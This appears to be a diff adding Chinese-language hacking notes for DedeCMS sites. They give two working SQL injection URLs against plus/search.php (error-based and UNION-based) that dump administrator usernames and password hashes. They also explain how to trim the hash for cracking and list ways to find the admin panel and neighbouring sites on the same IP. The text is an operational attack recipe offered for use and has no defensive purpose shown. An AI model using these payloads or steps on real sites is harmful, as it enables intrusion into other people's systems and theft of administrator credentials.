@@ -1,0 +1,18 @@
+访问这个：plus/search.php?keyword=as&typeArr[ uNion ]=a
+看结果如果提示：Safe Alert: Request Error step 1 !
+ 
+那么直接用下面的exp爆出所有管理员的帐号密码：
+plus/search.php?keyword=as&typeArr[111%3D@`\'`)+and+(SELECT+1+FROM+(select+count(*),concat(floor(rand(0)*2),(substring((select+CONCAT(0x7c,userid,0x7c,pwd)+from+`%23@__admin`+limit+0,1),1,62)))a+from+information_schema.tables+group+by+a)b)%23@`\'`+]=a
+
+看结果如果提示：Safe Alert: Request Error step 2 !
+那么直接用下面的exp爆出所有管理员的帐号密码：  a198654
+plus/search.php?keyword=as&typeArr[111%3D@`\'`)+UnIon+seleCt+1,2,3,4,5,6,7,8,9,10,userid,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,pwd,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42+from+`%23@__admin`%23@`\'`+]=a
+有些/plus/目录换成了/plugins/目录，这时就要把/plus/换成/plugins/进行注射了
+破解出md5为20位结果，只需要把前三位和后一位去掉，剩余16位拿去解密即可
+
+如何找后台？
+默认后台：dede
+第一种方法：data/mysql_error_trace.inc （有时可以爆出路径）
+第二种方法：把域名作为后台去尝试
+第三种方法：查看这个文件：robots.txt
+第四种方法：ping下域名获得ip之后，http://www.bing.com/ 搜索：ip:127.0.0.1 php （可能获得后台也可以获得其他旁注站，一般dede的旁站很多也是dedecms的）
